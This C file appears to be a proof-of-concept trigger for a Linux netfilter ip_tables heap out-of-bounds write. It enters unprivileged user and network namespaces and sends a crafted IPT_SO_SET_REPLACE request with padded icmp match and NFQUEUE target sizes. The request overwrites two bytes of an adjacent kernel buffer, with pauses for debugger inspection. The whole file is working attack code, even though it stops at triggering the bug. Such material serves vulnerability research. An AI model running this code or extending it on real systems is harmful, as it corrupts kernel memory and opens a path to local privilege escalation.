#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <inttypes.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PRIMARY_SIZE 0x1000

int
trigger_oob_write(int s)
{
    struct __attribute__((__packed__)) {
        struct ipt_replace replace;
        struct ipt_entry entry;
        struct xt_entry_match match;
        char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
        struct xt_entry_target target;
    }
    data = {0};

    data.replace.num_counters = 1;
    data.replace.num_entries = 1;
    data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                         sizeof(data.pad) + sizeof(data.target));

    data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                              sizeof(data.pad) + sizeof(data.target));
    data.entry.target_offset =
        (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

    data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
    strcpy(data.match.u.user.name, "icmp");
    data.match.u.user.revision = 0;

    data.target.u.user.target_size = sizeof(data.target);
    strcpy(data.target.u.user.name, "NFQUEUE");
    data.target.u.user.revision = 1;

    // Partially overwrite the adjacent buffer with 2 bytes of zero.
    if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
        if (errno == ENOPROTOOPT) {
            printf("[-] Error ip_tables module is not loaded.\n");
            return -1;
        }
    }

    return 0;
}

int
setup_sandbox(void)
{
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }
    return 0;
}

void
pause_for_inspection(char* msg)
{
    puts(msg);
    getchar();
}

int
main(void)
{
    int s;

    pause_for_inspection("Setup sandbox");
    if (setup_sandbox() < 0) {
        goto err;
    }

    pause_for_inspection("Setup Socket");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[-] socket");
        goto err;
    }

    pause_for_inspection("Trigger Bug");
    if (trigger_oob_write(s) < 0) {
        goto err;
    }

err:
    return -1;

    return 0;
}
